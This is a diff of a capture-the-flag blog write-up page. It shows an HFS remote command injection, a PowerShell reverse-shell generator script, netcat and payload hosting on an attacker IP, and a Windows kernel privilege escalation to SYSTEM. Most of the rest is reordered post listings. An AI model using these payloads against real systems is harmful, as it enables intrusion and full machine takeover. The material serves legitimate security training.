-C:\Users\kostas\Desktop&gt;41020.exe
-
-[+] Trigerring Exploit.
-Done filling.
-GetBitmapBits Result. 1000
-index: 1017
-
-Gh04 header:
-0000bc234768303431f27d92c8af0d58
-Gh05 header:
-bc003c23476830350000000000000000
-Previous page Gh04 (Leaked address):
-4050477101f9ffff
-Pvsca0:
-305e477101f9ffff
-
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Users\kostas\Desktop&gt; whoami
-
-nt authority\system :D</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41020.exe
+</span><span class="go">meterpreter &gt; upload 41020.exe
+</span><span class="go">meterpreter &gt; shell
+</span><span class="go">C:\Users\kostas\Desktop&gt;41020.exe
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[+] Trigerring Exploit.
+</span><span class="go">Done filling.
+</span><span class="go">GetBitmapBits Result. 1000
+</span><span class="go">index: 1017
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Gh04 header:
+</span><span class="go">0000bc234768303431f27d92c8af0d58
+</span><span class="go">Gh05 header:
+</span><span class="go">bc003c23476830350000000000000000
+</span><span class="go">Previous page Gh04 (Leaked address):
+</span><span class="go">4050477101f9ffff
+</span><span class="go">Pvsca0:
+</span><span class="go">305e477101f9ffff
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Microsoft Windows [Version 6.3.9600]
+</span><span class="go">(c) 2013 Microsoft Corporation. All rights reserved.
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">C:\Users\kostas\Desktop&gt; whoami
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">nt authority\system :D
+</span></code></pre></div></div>
 
 <h2 id="without-metasploit">Without Metasploit</h2>
 
@@ -608,88 +622,91 @@ nt authority\system :D</code></pre></div>
 <p>Usage is : python exploit.py RHOST RPORT (Don&rsquo;t forget to change the Local IP address and Port number inside the script).</p>
 
 <p>We need to host netcat (<a href="http://attackers_ip:80/nc.exe" target="_blank">http://attackers_ip:80/nc.exe</a>) using a web server.
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mkdir http &amp;&amp; cd http
-$ wget https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/exe/nc.exe
-$ sudo python2 -m SimpleHTTPServer 80
-$ nc -lvp 60001</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>mkdir http <span class="o">&amp;&amp;</span> <span class="nb">cd</span> http
+<span class="gp">$ </span>wget https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/exe/nc.exe
+<span class="gp">$ </span>sudo python2 -m SimpleHTTPServer <span class="m">80</span>
+<span class="gp">$ </span>nc -lvp <span class="m">60001</span>
+</code></pre></div></div></p>
 
 <p>Make sure you have changed the local IP and port inside the script and run:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python2 39161.py 10.10.10.8 80 
-
-listening on [any] 60001 ...
-10.10.10.8: inverse host lookup failed: 
-connect to [10.10.15.150] from (UNKNOWN) [10.10.10.8] 49216
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Users\kostas\Desktop&gt;
-
-$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41020.exe
-
-C:\Users\kostas\Desktop&gt; powershell -c &#34;Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&#34;
-C:\Users\kostas\Desktop&gt; 41020.exe
-
-[+] Trigerring Exploit.
-Done filling.
-GetBitmapBits Result. 1000
-index: 1017
-
-Gh04 header:
-0000bc234768303431f27d92c8af0d58
-Gh05 header:
-bc003c23476830350000000000000000
-Previous page Gh04 (Leaked address):
-4050477101f9ffff
-Pvsca0:
-305e477101f9ffff
-
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Users\kostas\Desktop&gt; whoami
-
-nt authority\system :D</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>python2 39161.py 10.10.10.8 <span class="m">80</span> 
+<span class="err">
+</span><span class="err"></span><span class="go">listening on [any] 60001 ...
+</span><span class="go">10.10.10.8: inverse host lookup failed: 
+</span><span class="go">connect to [10.10.15.150] from (UNKNOWN) [10.10.10.8] 49216
+</span><span class="go">Microsoft Windows [Version 6.3.9600]
+</span><span class="go">(c) 2013 Microsoft Corporation. All rights reserved.
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">C:\Users\kostas\Desktop&gt;
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41020.exe
+<span class="err">
+</span><span class="err"></span><span class="go">C:\Users\kostas\Desktop&gt; powershell -c &#34;Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&#34;
+</span><span class="go">C:\Users\kostas\Desktop&gt; 41020.exe
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[+] Trigerring Exploit.
+</span><span class="go">Done filling.
+</span><span class="go">GetBitmapBits Result. 1000
+</span><span class="go">index: 1017
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Gh04 header:
+</span><span class="go">0000bc234768303431f27d92c8af0d58
+</span><span class="go">Gh05 header:
+</span><span class="go">bc003c23476830350000000000000000
+</span><span class="go">Previous page Gh04 (Leaked address):
+</span><span class="go">4050477101f9ffff
+</span><span class="go">Pvsca0:
+</span><span class="go">305e477101f9ffff
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Microsoft Windows [Version 6.3.9600]
+</span><span class="go">(c) 2013 Microsoft Corporation. All rights reserved.
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">C:\Users\kostas\Desktop&gt; whoami
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">nt authority\system :D
+</span></code></pre></div></div></p>
 
 <h3 id="using-python-and-powershell">Using python and powershell</h3>
 
 <p>Do we really need to upload nc.exe? Not really. We have powershell on the box.
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
 <span class="c1"># Author: Alamot</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">urllib2</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;usage: &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;&#34;</span><span class="p">)</span>
-    <span class="nb">exit</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;usage: &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;&#34;</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">()</span>
 
 <span class="n">RHOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 <span class="n">RPORT</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
 <span class="n">LHOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
 <span class="n">LPORT</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;RHOST=&#34;</span><span class="o">+</span><span class="n">RHOST</span><span class="o">+</span><span class="s2">&#34; RPORT=&#34;</span><span class="o">+</span><span class="n">RPORT</span><span class="o">+</span><span class="s2">&#34; LHOST=&#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="o">+</span><span class="s2">&#34; LPORT=&#34;</span><span class="o">+</span><span class="n">LPORT</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;RHOST=&#34;</span><span class="o">+</span><span class="n">RHOST</span><span class="o">+</span><span class="s2">&#34; RPORT=&#34;</span><span class="o">+</span><span class="n">RPORT</span><span class="o">+</span><span class="s2">&#34; LHOST=&#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="o">+</span><span class="s2">&#34; LPORT=&#34;</span><span class="o">+</span><span class="n">LPORT</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">LPORT</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">LPORT</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s2">; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
 <span class="n">b64enc_command</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;+&#39;</span><span class="p">,</span><span class="s1">&#39;%2b&#39;</span><span class="p">)</span>
 
 <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="n">RHOST</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="n">RPORT</span><span class="o">+</span><span class="s2">&#34;/?search=%00{.exec%7CC:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">WindowsPowerShell</span><span class="se">\\</span><span class="s2">v1.0</span><span class="se">\\</span><span class="s2">powershell.exe%20-EncodedCommand%20&#34;</span><span class="o">+</span><span class="n">b64enc_command</span><span class="o">+</span><span class="s2">&#34;.}&#34;</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 <span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">STATUS: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">getcode</span><span class="p">()))</span></code></pre></div></p>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">STATUS: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">getcode</span><span class="p">()))</span></code></pre></div></p>
 
 <p>Let&rsquo;s run the above python script.
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc -lvp 60002
-listening on [any] 60002 ...
-
-$ python send_powershell_payload.py 10.10.10.8 80 LHOST 60002
-
-connect to [10.10.15.150] from (UNKNOWN) [10.10.10.8] 49258
-PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>nc -lvp <span class="m">60002</span>
+<span class="go">listening on [any] 60002 ...
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>python send_powershell_payload.py 10.10.10.8 <span class="m">80</span> LHOST <span class="m">60002</span>
+<span class="err">
+</span><span class="err"></span><span class="go">connect to [10.10.15.150] from (UNKNOWN) [10.10.10.8] 49258
+</span><span class="go">PS C:\Users\kostas\Desktop&gt; 
+</span></code></pre></div></div></p>
 
         </div>
 
@@ -719,6 +736,358 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
           
            
            
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -904,17 +1273,57 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
@@ -924,21 +1333,37 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -988,41 +1413,17 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1040,57 +1441,21 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1152,26 +1517,6 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
           
            
            
@@ -1201,20 +1546,24 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
            
           
            
@@ -1247,294 +1596,6 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></p>
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
